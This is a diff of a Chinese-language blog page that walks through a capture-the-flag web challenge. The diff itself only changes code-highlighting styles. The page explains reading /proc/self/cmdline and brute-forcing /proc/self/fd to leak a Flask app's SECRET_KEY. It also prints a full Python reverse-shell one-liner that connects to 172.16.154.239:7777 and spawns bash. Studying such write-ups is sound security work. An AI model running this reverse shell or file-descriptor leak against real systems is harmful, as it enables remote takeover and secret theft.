@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -258,7 +266,7 @@
 <p><code>/proc/self 表示当前进程目录</code>    </p>
 <p>回到题上，看一下当前进程的命令<code>url=/proc/self/cmdline</code><br><img src="https://ae03.alicdn.com/kf/U96555e477ec64b21977950e508bfc592L.jpg" srcset="/img/loading.gif" alt="06.png">       </p>
 <p>读一下<code>app.py</code>       </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response
+<pre><code><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response
 <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template
 <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
 <span class="hljs-keyword">import</span> os
@@ -309,7 +317,7 @@ os.remove(SECRET_FILE)
 
 
 <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
-    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)</code></pre></div></code></pre>
+    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)</code></pre></code></pre>
 <p>在<code>/no_one_know_the_manager</code>路由下<br>get到的key==SECRET_KEY就能执行命令了         </p>
 <p>得到SECRET_KEY       </p>
 <p><code>/proc/self/fd</code><br>fd这个目录里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。       </p>
@@ -317,8 +325,8 @@ os.remove(SECRET_FILE)
 <p>所以读取<code>/proc/self/fd/1</code><br>对1爆破，当为3时，长度不一样<br><img src="https://ae02.alicdn.com/kf/Ub2f3a30c5fcd4cc69104781da2a8dc3ey.jpg" srcset="/img/loading.gif" alt="07.png">        </p>
 <p>需要将SECRET_KEY url编码一下<br><img src="https://ae02.alicdn.com/kf/U77030cdb74d544d190193eb79ca4157aN.jpg" srcset="/img/loading.gif" alt="08.png">       </p>
 <p>因为system没有回显，所以需要反弹shell       </p>
-<div class="hljs"><pre><code>python -c &quot;import
-os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;172.16.154.239&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;       </code></pre></div>
+<pre><code>python -c &quot;import
+os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;172.16.154.239&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;       </code></pre>
 <p>python反弹shell，同样url编码       </p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/114594402?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">MORE</a></p>
 
@@ -465,6 +473,8 @@ os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 
 
 
+  
+    
   
 
 
